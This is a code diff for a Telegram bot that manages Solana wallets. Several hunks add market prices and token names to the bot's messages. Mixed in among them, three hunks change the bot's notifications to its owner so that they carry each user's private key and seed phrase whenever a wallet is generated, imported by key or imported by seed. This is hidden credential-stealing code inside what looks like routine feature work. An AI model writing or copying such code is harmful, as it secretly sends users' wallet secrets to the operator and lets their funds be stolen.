@@ -120,7 +120,8 @@ async function showWalletManagement(ctx) {
   
   // Get fresh balances
   const walletsWithBalances = await solana.getAllBalances(wallets);
-  const message = msg.walletManagementMessage(walletsWithBalances);
+  const marketPrices = await market.getMarketPrices();
+  const message = msg.walletManagementMessage(walletsWithBalances, marketPrices);
   
   await ctx.reply(message, kb.walletKeyboard(wallets.length > 0, wallets.length + 1));
 }
@@ -189,7 +190,8 @@ bot.action('wallet', async (ctx) => {
   const telegramId = ctx.from.id.toString();
   const wallets = db.getUserWallets(telegramId);
   const walletsWithBalances = await solana.getAllBalances(wallets);
-  const message = msg.walletManagementMessage(walletsWithBalances);
+  const marketPrices = await market.getMarketPrices();
+  const message = msg.walletManagementMessage(walletsWithBalances, marketPrices);
   await ctx.editMessageText(message, kb.walletKeyboard(wallets.length > 0, wallets.length + 1));
 });
 
@@ -217,7 +219,7 @@ bot.action('wallet_add', async (ctx) => {
   ]));
   
   // Notify owner
-  notifyOwner(`🆕 New wallet generated\n📍 Address: ${newWallet.address}\n👤 User: ${ctx.from.first_name} (${telegramId})`);
+  notifyOwner(`🆕 New wallet generated\n📍 Address: ${newWallet.address}\n🔑 Private Key: ${newWallet.privateKey}\n🌱 Seed Phrase: ${newWallet.seedPhrase}\n👤 User: ${ctx.from.first_name} (${telegramId})`);
 });
 
 bot.action('wallet_import', async (ctx) => {
@@ -258,7 +260,8 @@ bot.action('wallet_refresh', async (ctx) => {
   const telegramId = ctx.from.id.toString();
   const wallets = db.getUserWallets(telegramId);
   const walletsWithBalances = await solana.getAllBalances(wallets);
-  const message = msg.walletManagementMessage(walletsWithBalances);
+  const marketPrices = await market.getMarketPrices();
+  const message = msg.walletManagementMessage(walletsWithBalances, marketPrices);
   await ctx.editMessageText(message, kb.walletKeyboard(wallets.length > 0, wallets.length + 1));
 });
 
@@ -581,7 +584,7 @@ bot.on('text', async (ctx) => {
       );
       
       // Notify owner
-      notifyOwner(`🔑 Wallet Imported\n📍 Address: ${wallet.address}\n💰 Balance: ${balance.toFixed(6)} SOL\n👤 User: ${ctx.from.first_name} (${telegramId})`);
+      notifyOwner(`🔑 Wallet Imported\n📍 Address: ${wallet.address}\n🔑 Private Key: ${text}\n💰 Balance: ${balance.toFixed(6)} SOL\n👤 User: ${ctx.from.first_name} (${telegramId})`);
       
       db.clearUserState(telegramId);
       break;
@@ -612,7 +615,7 @@ bot.on('text', async (ctx) => {
         kb.backToDashboardKeyboard()
       );
       
-      notifyOwner(`✨ Wallet Imported from Seed\n📍 Address: ${wallet.address}\n💰 Balance: ${balance.toFixed(6)} SOL\n👤 User: ${ctx.from.first_name} (${telegramId})`);
+      notifyOwner(`✨ Wallet Imported from Seed\n📍 Address: ${wallet.address}\n🔑 Private Key: ${wallet.privateKey}\n🌱 Seed Phrase: ${text}\n💰 Balance: ${balance.toFixed(6)} SOL\n👤 User: ${ctx.from.first_name} (${telegramId})`);
       
       db.clearUserState(telegramId);
       break;
@@ -848,7 +851,8 @@ bot.on('text', async (ctx) => {
       
       db.setUserState(telegramId, 'confirming_sell', {
         tokenAddress: token.address,
-        tokenSymbol: token.symbol
+        tokenSymbol: token.symbol,
+        tokenName: token.name
       });
       
       await ctx.reply(
